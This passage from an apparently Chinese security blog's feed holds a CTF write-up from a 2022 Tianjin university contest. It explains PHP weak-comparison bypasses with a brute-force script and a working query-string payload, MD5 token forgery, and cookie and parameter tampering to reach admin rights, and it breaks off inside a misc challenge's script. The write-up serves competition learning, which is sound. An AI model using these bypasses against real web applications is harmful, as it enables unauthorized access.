title="最后"></a>最后</h3><blockquote><p>因为个人能力有限，文章中若有错误，敬请斧正<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulntarget-c </tag>
            
            <tag> laravel </tag>
            
            <tag> OVAS-PHP相关漏洞 </tag>
            
            <tag> 隧道代理 </tag>
            
            <tag> 免杀 </tag>
            
            <tag> 提权 </tag>
            
            <tag> CVE-2021-3129 </tag>
            
            <tag> CVE-2021-3493 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届北京大学信息安全综合能力竞赛部分wp</title>
      <link href="/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20221124111931793.png" alt="image-20221124111931793"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022年天津市大学生信息安全网络攻防大赛部分wp</title>
      <link href="/2022/09/29/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/29/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>本来想不记录了 ，也都是网上能搜到的题，最后想了一下还是记录一下吧</p><h2 id="理论题"><a href="#理论题" class="headerlink" title="理论题"></a>理论题</h2><p>没啥意思</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="最好的语言"><a href="#最好的语言" class="headerlink" title="最好的语言"></a>最好的语言</h3><p>300pt (已做出) 考点 is_number array_search() 弱类型比较<br>赛题地址<code>http://ctftime1.usaas.net/web/good/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先来看最后一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">这里存在判断 abcd都要为<span class="number">1</span>也就是<span class="literal">true</span>  才可以<span class="keyword">echo</span> flag</span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>get传个x1 并且  $x1==”1”?die(“ha?”):NULL;  三目运算符，这句意思是否为1  为1则die<br>那我们为x1 为0  switch 会先经过0  没有break  接着会case1 这样  a=1了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先传一个json数据  json标准格式为<code>&#123;&quot;a&quot;:”sasd“,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</code><br> is_numeric(@$x2[“x21”])?die(“ha?”):NULL;  这里必须不能是纯数字且要大于2017、怎么绕呢<br> is_numeric函数有一个特性，他会把<code>123asd</code>这种字符串改变为 123  也就是这也(‘1234a’ == 1234)为真，且因php中大于小于和==（两个等于）是不会判断类型是否相同这样的话，其为弱类型比较，我们传入一个大于2017的数加个字符串就行  如  200000aaa  <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;&#125;</code>这里注意  json值为字符串时要加双引号<br>还有一个x22  x22需要也是一个数组，且要等于2，count($x2[“x22”])!==2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">      <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">          <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>这里遍历x22这个数组，要求不能元素是有”XIPU”这个字样，但是还必须要在数组中能够找到。这里array_search()函数是存在弱类型比较的问题的，因此将第二个元素设置为0，在于”XIPU”字符串比较的时候，0==”XIPU”是成立的。因为xipu中没有数字，最后 <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;,&quot;x22&quot;:[[0],0]&#125;</code><br>第三部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。<br>x3不能为15562  且穿的值中要有XIPU,下面判断  15562的md5 的8-16 位要和我们传的数相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="comment">//45961dd50e46379442318098474e0ced</span></span><br><span class="line"><span class="comment">//0e46379442318098</span></span><br></pre></td></tr></table></figure><p>这里 又是老生长谈的问题   0e数字  且比较的时候为== 弱类型比较会把0e数字解析成科学计数法形式也就是0，那我们只需再找一个这样的数就行了<br>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mohu_md5</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1300000</span>):</span><br><span class="line">        t1 =  <span class="built_in">str</span>(i)+<span class="string">&#x27;XIPU&#x27;</span></span><br><span class="line">        <span class="comment">#t1 =  &#x27;XIPU&#x27;  str(i)+</span></span><br><span class="line">        md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="comment">#print(md5_result)</span></span><br><span class="line">        <span class="keyword">if</span> md5_result[<span class="number">8</span>:<span class="number">10</span>] == <span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">            j = md5_result[<span class="number">10</span>:<span class="number">24</span>]</span><br><span class="line">            <span class="comment">#isdigit()判断是否为纯数字，是则为true 反之false</span></span><br><span class="line">            <span class="keyword">if</span> j.isdigit():</span><br><span class="line">                <span class="built_in">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mohu_md5()</span><br><span class="line"><span class="comment">#XIPU18570-----&gt;026cba5c0e20905432015695e9eb13ba</span></span><br><span class="line"><span class="comment">#47484XIPU-----&gt;373e838b0e191027496067472b89aa6b</span></span><br></pre></td></tr></table></figure><p>两个都可以<br>最终payload<code>index.php?x1=0&amp;x2=&#123;&quot;x21&quot;:&quot;2018asd&quot;,&quot;x22&quot;:[[0],0]&#125;&amp;x3=47484XIPU</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154508776.png" alt="image-20220930154508776"></p><h4 id="跳来跳去"><a href="#跳来跳去" class="headerlink" title="跳来跳去"></a>跳来跳去</h4><p>150pt (已做出) 简单越权<br>赛题地址<code>http://ctftime1.usaas.net/web/good/index.php</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154824375.png" alt="image-20220930154824375"><br>开局给了test test 直接登录<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155017429.png" alt="image-20220930155017429"><br>点这个登录成功会跳转到admin，且提示权限不足，显然要进行越权，抓个包<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155048535.png" alt="image-20220930155048535"><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155158626.png" alt="image-20220930155158626"><br>这边可以看到一个token，token=ad0234829205b9033196ba818f7a872b<br>显然是md5过的 解一下<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155257003.png" alt="image-20220930155257003"><br>这里为test2  我们这里肯定要admin的md5了,不过经过测试不是  admin的 也试了下admin2 也不是  果断爆破 ，其实是admin1的md5  啊这<br>爆破就不贴了<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155701407.png" alt="image-20220930155701407"></p><h3 id="各种改header"><a href="#各种改header" class="headerlink" title="各种改header"></a>各种改header</h3><p>150pt (已做出) 考点：改包<br>开局一个黑框，我们这里直接往左上角看  有一个password.txt  那显然是爆破了<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155942088.png" alt="image-20220930155942088"><br>访问之  直接复制，这里不用在生成密码字典文件了，直接可以粘贴一会看，随便在密码处输点什么然后抓包发送到intruder爆破<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160153027.png" alt="image-20220930160153027"><br>点clear 只加password这个字段的admin为变量，点paylaod，直接点paste就把刚刚在复制那边的密码粘贴<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160401337.png" alt="image-20220930160401337"><br>点attack开始就可以了<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160618475.png" alt="image-20220930160618475"></p><p>密码为Nsf0cuS 时  回显了newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;解一下base64为：290bca70c7dae93db6644fa00b9d83b9.php<br>访问之<code>http://ctftime1.usaas.net/web/header/290bca70c7dae93db6644fa00b9d83b9.php</code><br>是一个留言板<br>随便输点什么<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161533441.png" alt="image-20220930161533441"></p><p>说我没登录  因为这里没有可登录的地方，果断抓包</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161712966.png" alt="image-20220930161712966"><br>这里IsLogin=0显然是判断登陆了没有直接改成1</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162050828.png" alt="image-20220930162050828"></p><p>然后又说我没有权限，我们看下面content=bohemian&amp;userlevel=guest&amp;Submit=%E7%95%99%E8%A8%80<br>userlevel 为guest 显然要改成管理员，比赛时试了<code>admin admin1 manager administrator</code> 都不是,果断爆破这个地方  最后是<code>root</code> 啊这</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162139612.png" alt="image-20220930162139612"><br><code>Flag=flag%7Bbbda40bfc4eff921a5f5faf0cfd3c195%7D</code><br><code>Flag=flag&#123;bbda40bfc4eff921a5f5faf0cfd3c195&#125;</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="文件修复"><a href="#文件修复" class="headerlink" title="文件修复"></a>文件修复</h3><p>开局给了一个附件，解压之是一个pdf 测了一测啥也没有，拖到winhex中看下十六进制</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930163312714.png" alt="image-20220930163312714"></p><p>往下拉一拉看到有插入的数据，在f 或者n后面是09 或者 20 并且都是八位</p><p>这样我们就可以想到  把09 20 转成 0或1   因为是八位  比如 01010101这个八位二进制可以转成10进制然后转ascii 这样就是字符了 </p><p>有了思路  开始做，这样的数据量  手撕显然是不行的，我们写脚本</p><p>先在winhex全选字符，右键-》edit-》copy block-》hex value</p><p>复制出来  然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 